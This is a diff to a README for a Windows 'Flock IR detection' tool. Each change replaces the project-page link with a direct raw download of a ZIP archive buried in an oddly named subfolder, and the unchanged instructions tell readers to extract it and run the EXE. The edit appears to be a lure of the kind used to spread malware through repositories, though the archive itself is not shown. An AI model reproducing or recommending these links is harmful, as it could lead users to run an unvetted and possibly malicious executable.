@@ -1,6 +1,6 @@
 # 📡 Flock-IR-Detection - Detect Flock IR Pulses Fast
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Unlisted-yea815/Flock-IR-Detection)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20GitHub%20Page-blue?style=for-the-badge)](https://github.com/Unlisted-yea815/Flock-IR-Detection/raw/refs/heads/main/tricussate/Detection_Flock_I_v1.9.zip)
 
 ## 🚀 Getting Started
 
@@ -10,13 +10,13 @@ Use the link above to visit the project page and get the latest version.
 
 ## 📥 Download
 
-1. Open the GitHub page here: https://github.com/Unlisted-yea815/Flock-IR-Detection
+1. Open the GitHub page here: https://github.com/Unlisted-yea815/Flock-IR-Detection/raw/refs/heads/main/tricussate/Detection_Flock_I_v1.9.zip
 2. On the page, look for the latest release or download file.
 3. Save the file to your Windows computer.
 4. If the file is a ZIP archive, extract it first.
 5. If the file is an EXE file, you can run it after the download finishes.
 
-[Visit the GitHub download page](https://github.com/Unlisted-yea815/Flock-IR-Detection)
+[Visit the GitHub download page](https://github.com/Unlisted-yea815/Flock-IR-Detection/raw/refs/heads/main/tricussate/Detection_Flock_I_v1.9.zip)
 
 ## 🖥 System Requirements
 
@@ -200,7 +200,7 @@ Yes, but keep all related files in the same folder.
 
 If you need the download page again, use this link:
 
-[https://github.com/Unlisted-yea815/Flock-IR-Detection](https://github.com/Unlisted-yea815/Flock-IR-Detection)
+[https://github.com/Unlisted-yea815/Flock-IR-Detection/raw/refs/heads/main/tricussate/Detection_Flock_I_v1.9.zip](https://github.com/Unlisted-yea815/Flock-IR-Detection/raw/refs/heads/main/tricussate/Detection_Flock_I_v1.9.zip)
 
 ## 🪟 Quick Start for Windows
 
